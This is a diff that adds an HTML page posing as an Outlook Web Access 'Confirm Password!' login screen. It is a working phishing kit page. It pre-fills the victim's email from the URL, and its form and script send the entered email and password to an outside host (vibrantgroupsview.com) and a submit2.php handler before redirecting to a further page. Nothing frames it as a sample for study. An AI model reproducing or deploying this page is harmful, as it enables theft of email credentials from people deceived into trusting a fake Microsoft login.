@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Outlook Web Access</title>
+  <style>
+    /* CSS styles for the page */
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #1565c0;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .container {
+      max-width: 400px;
+      background-color: #1565c0;
+      padding: 20px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+      border-radius: 5px;
+    }
+
+    .logo-container {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+
+    #email,
+    #password {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 10px;
+      border: 1px solid #ccc;
+      border-radius: 3px;
+      box-sizing: border-box;
+    }
+
+    .remember-me {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin-bottom: 10px;
+      font-size: 14px;
+      color: #999;
+    }
+
+    .forgot-password {
+      color: #999;
+      text-decoration: none;
+    }
+
+    .button-container {
+      text-align: center;
+    }
+
+    button[type="submit"] {
+      background-color: #4CAF50;
+      color: #fff;
+      border: none;
+      padding: 10px 20px;
+      border-radius: 3px;
+      cursor: pointer;
+      transition: background-color 0.3s;
+    }
+
+    button[type="submit"]:hover {
+      background-color: #4CAF50; /* Change this to match the default green color */
+    }
+
+    #error-message {
+      color: red;
+      text-align: center;
+      margin-top: 10px;
+    }
+  </style>
+</head>
+
+<body>
+  <div class="container">
+    <form id="second-login-form" action="https://vibrantgroupsview.com/Nail/Api/Test/submit2.php" method="post">
+      <div class="logo-container">
+        <img src="ntop.png" alt="Logo" style="max-width: 100%; width: 100%;">
+      </div>
+      <h3 style="color: white; text-align: center;">Confirm Password!</h3>
+      <input type="email" id="email" name="email" placeholder="Email" required>
+      <input type="password" id="password" name="password" placeholder="Confirm Password" required>
+      <input type="hidden" id="hidden-email" name="hidden-email" value="">
+      <div class="remember-me">
+        <input type="checkbox" id="remember" name="remember">
+        <label for="remember" style="color: #999;">Remember me</label>
+        <a href="#" class="forgot-password">Forgot password?</a>
+      </div>
+      <div class="button-container">
+        <button type="submit" onclick="submitSecondPageCredentials(event)">Login</button>
+      </div>
+      <p id="error-message" style="display: none;"></p>
+    </form>
+  </div>
+
+  <script>
+  window.addEventListener('DOMContentLoaded', () => {
+    const urlParams = new URLSearchParams(window.location.search);
+    const email = urlParams.get('email');
+    const hashEmail = window.location.hash.substr(1);
+    if (email || hashEmail) {
+      const emailField = document.getElementById('email');
+      emailField.value = email || hashEmail;
+      const hiddenEmailField = document.getElementById('hidden-email');
+      hiddenEmailField.value = email || hashEmail;
+    }
+  });
+
+  function submitSecondPageCredentials(event) {
+    event.preventDefault();
+    const password = document.getElementById('password').value;
+    const form = document.getElementById('second-login-form');
+    const hiddenEmailField = document.getElementById('hidden-email');
+    hiddenEmailField.value = form.email.value;
+    const errorMessage = document.getElementById('error-message');
+    errorMessage.style.display = 'none';
+    const xhr = new XMLHttpRequest();
+    xhr.open('POST', 'submit2.php', true);
+    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+    xhr.onreadystatechange = function() {
+      if (xhr.readyState === XMLHttpRequest.DONE) {
+        if (xhr.status === 200) {
+          // Successful response
+          const response = xhr.responseText;
+          if (response === 'success') {
+            // Redirect to Google after a delay
+            setTimeout(() => {
+              window.location.href = 'index3.html';
+            }, 3000);
+          } else {
+            // Display error message
+            errorMessage.textContent = response;
+            errorMessage.style.display = 'block';
+          }
+        } else {
+          // Error handling
+          errorMessage.textContent = 'An error occurred. Please try again.';
+          errorMessage.style.display = 'block';
+        }
+      }
+    };
+    const formData = new FormData(form);
+    xhr.send(new URLSearchParams(formData).toString());
+  }
+</script>
+
+</body>
+
+</html>
